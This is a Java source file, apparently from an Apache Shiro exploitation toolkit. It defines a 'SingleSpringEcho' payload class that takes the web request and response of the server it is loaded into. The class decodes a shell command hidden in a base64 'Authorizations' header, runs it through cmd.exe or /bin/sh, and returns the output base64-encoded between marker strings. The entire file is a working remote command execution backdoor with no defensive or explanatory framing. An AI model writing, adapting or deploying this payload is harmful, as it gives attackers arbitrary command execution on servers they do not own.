package com.sma11new.exp.shiro.attack.shell;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
public class SingleSpringEcho {

    public SingleSpringEcho() {
        System.out.println("SingleSpringEcho");
        /*try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {}*/
    }

    @Override
    public boolean equals(Object obj) {
        try {
            Object[] objs = parseObj(obj);
            System.out.println(objs.length);
            javax.servlet.http.HttpServletRequest httpRequest = (javax.servlet.http.HttpServletRequest)objs[0];
            javax.servlet.http.HttpServletResponse httpResponse = (javax.servlet.http.HttpServletResponse)objs[1];

            String te = httpRequest.getHeader("Host");
            httpResponse.addHeader("Host", te);
            String tc = httpRequest.getHeader("Authorizations");
            if (tc != null && !tc.isEmpty()) {
                String p = org.apache.shiro.codec.Base64.decodeToString(tc.replaceAll("Basic ", ""));
                String[] cmd = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
                String base64Str = "";
                base64Str = org.apache.shiro.codec.Base64.encodeToString(result);
                httpResponse.getWriter().write("BrY3jhHrh6" + base64Str + "yQqlMgS1cL");
            }
            httpResponse.getWriter().flush();
            httpResponse.getWriter().close();
        } catch (Exception e) {
            e.getStackTrace();
        }
        return true;
    }

    public Object[] parseObj(Object obj) {
        Object[] data = new Object[2];
        if (obj.getClass().isArray()) {
            data = (Object[]) obj;
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                data[0] = clazz.getDeclaredMethod("getRequest").invoke(obj);
                data[1] = clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    HttpServletRequest request = (HttpServletRequest)obj;
                    HttpServletResponse response = null;

                    try {
                        Field req = request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            response = (HttpServletResponse)request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }

                    data[0] = request;
                    data[1] = response;
                }
            }
        }
        return data;
    }
}
